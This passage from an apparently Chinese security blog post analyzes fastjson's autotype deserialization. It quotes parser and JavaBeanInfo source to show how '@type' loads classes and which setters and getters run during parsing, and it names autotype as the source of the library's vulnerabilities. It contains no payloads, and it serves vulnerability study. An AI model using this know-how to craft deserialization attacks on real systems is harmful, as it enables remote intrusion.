</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;can not cast to JSONObject.&#34;</span><span style=color:#ff79c6>,</span> e<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>平常用的在内部就是调用的 <code>JSON.parse</code>, 而且后面有个 <code>toJSON</code>, 在这其中会又序列化一遍调用 getter, 如果 getter 里面有问题, 那么也会导致漏洞. 不过一般还是用给 spring 的接口.</p><h2 id=autotype>autotype</h2><p>autotype 就是指这个反序列化 java 类的功能, 也是漏洞的源头. 在新版本里增加了黑名单检测, 所以这里先切到旧版</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>key <span style=color:#ff79c6>==</span> JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>DEFAULT_TYPE_KEY</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isEnabled</span><span style=color:#ff79c6>(</span>Feature<span style=color:#ff79c6>.</span><span style=color:#50fa7b>DisableSpecialKeyDetect</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>                        ref <span style=color:#ff79c6>=</span> lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>scanSymbol</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>symbolTable</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#39;&#34;&#39;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>                        Class<span style=color:#ff79c6>&lt;?&gt;</span> clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>ref<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>config</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDefaultClassLoader</span><span style=color:#ff79c6>());</span>
</span></span></code></pre></div><p>比较神奇的是它这个 parser, 只要 <code>@type</code> 不是这 object 的最后一个 key, 都是能正常工作的. 如果是最后一个 key, 返回一个调用默认构造器产生对象, 没有设置各种属性.<br>而如果不最后一个, 会调用 castToJavaBean 将之前解析的属性给赋值过去, 然后 deserializer.deserialze 走正常流程.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>key <span style=color:#ff79c6>==</span> JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>DEFAULT_TYPE_KEY</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>        <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isEnabled</span><span style=color:#ff79c6>(</span>Feature<span style=color:#ff79c6>.</span><span style=color:#50fa7b>DisableSpecialKeyDetect</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    String typeName <span style=color:#ff79c6>=</span> lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>scanSymbol</span><span style=color:#ff79c6>(</span>symbolTable<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#39;&#34;&#39;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isEnabled</span><span style=color:#ff79c6>(</span>Feature<span style=color:#ff79c6>.</span><span style=color:#50fa7b>IgnoreAutoType</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>JSON<span style=color:#ff79c6>.</span><span style=color:#50fa7b>DEFAULT_TYPE_KEY</span><span style=color:#ff79c6>,</span> typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>nextToken</span><span style=color:#ff79c6>(</span>JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>COMMA</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>token</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>==</span> JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>RBRACE</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span> <span style=color:#6272a4>// 最后一个 key, 当然接下来就是 } 了
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#6272a4></span>            lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>nextToken</span><span style=color:#ff79c6>(</span>JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>COMMA</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>                Object instance <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                ObjectDeserializer deserializer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>config</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDeserializer</span><span style=color:#ff79c6>(</span>clazz<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>deserializer <span style=color:#ff79c6>instanceof</span> JavaBeanDeserializer<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                    instance <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>cast</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>,</span> clazz<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>config</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>instance <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>                    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> Cloneable<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>                        instance <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;java.util.Collections$EmptyMap&#34;</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>                        instance <span style=color:#ff79c6>=</span> Collections<span style=color:#ff79c6>.</span><span style=color:#50fa7b>emptyMap</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;java.util.Collections$UnmodifiableMap&#34;</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>                        instance <span style=color:#ff79c6>=</span> Collections<span style=color:#ff79c6>.</span><span style=color:#50fa7b>unmodifiableMap</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>                        instance <span style=color:#ff79c6>=</span> clazz<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>                    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>                <span style=color:#ff79c6>return</span> instance<span style=color:#ff79c6>;</span>
</span></span></code></pre></div><p>不过按照设计, <code>@type</code> 肯定是放在最前面的. 这应该算 UB, 不做过多讨论.<br>正常情况应该是 deserializer.deserialze. 对于普通 Bean, 创建 deserialzer 是在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 的 <code>this.createJavaBeanDeserializer</code>, 取得 setter 是在 <code>JavaBeanInfo.build</code>. 判断 setter 的方法如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>startsWith</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;set&#34;</span><span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#8be9fd>char</span> c3 <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    String propertyName<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span>Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isUpperCase</span><span style=color:#ff79c6>(</span>c3<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> c3 <span style=color:#ff79c6>&lt;=</span> 512<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>c3 <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;_&#39;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>            propertyName <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>c3 <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;f&#39;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>            propertyName <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&lt;</span> 5 <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>!</span>Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isUpperCase</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>)))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>                <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>            propertyName <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>decapitalize</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>compatibleWithJavaBean</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        propertyName <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>decapitalize</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        propertyName <span style=color:#ff79c6>=</span> Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toLowerCase</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>+</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>很明显, 适配了常见的两种命名方式, set_xxx 和 setXxx, 下划线和驼峰, 还有一个 fxxx 命名方式没见过, 可能是阿里内部用的多吧 (逃</p><p>但是除了这种 setter, 实际上还会调用一些 getter, 先看相关代码</p><p>com.alibaba.fastjson.util.JavaBeanInfo</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>var30 <span style=color:#ff79c6>=</span> clazz<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getMethods</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>var29 <span style=color:#ff79c6>=</span> var30<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff79c6>for</span><span style=color:#ff79c6>(</span>i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> var29<span style=color:#ff79c6>;</span> <span style=color:#ff79c6>++</span>i<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    method <span style=color:#ff79c6>=</span> var30<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    String methodName <span style=color:#ff79c6>=</span> method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&gt;=</span> 4 <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>Modifier<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isStatic</span><span style=color:#ff79c6>(</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getModifiers</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>&amp;&amp;</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>startsWith</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;get&#34;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isUpperCase</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>&amp;&amp;</span> method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getParameterTypes</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>length</span> <span style=color:#ff79c6>==</span> 0 <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>(</span>Collection<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>isAssignableFrom</span><span style=color:#ff79c6>(</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getReturnType</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>||</span> Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>isAssignableFrom</span><span style=color:#ff79c6>(</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getReturnType</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>||</span> AtomicBoolean<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span> <span style=color:#ff79c6>==</span> method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getReturnType</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>||</span> AtomicInteger<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span> <span style=color:#ff79c6>==</span> method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getReturnType</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>||</span> AtomicLong<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span> <span style=color:#ff79c6>==</span> method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getReturnType</span><span style=color:#ff79c6>()))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        JSONField annotation <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>JSONField<span style=color:#ff79c6>)</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getAnnotation</span><span style=color:#ff79c6>(</span>JSONField<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>annotation <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>!</span>annotation<span style=color:#ff79c6>.</span><span style=color:#50fa7b>deserialize</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            String propertyName<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>annotation <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>&amp;&amp;</span> annotation<span style=color:#ff79c6>.</span><span style=color:#50fa7b>name</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&gt;</span> 0<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>                propertyName <span style=color:#ff79c6>=</span> annotation<span style=color:#ff79c6>.</span><span style=color:#50fa7b>name</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>            <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>                propertyName <span style=color:#ff79c6>=</span> Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toLowerCase</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>+</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>            <span style=color:#ff79c6>}</span>
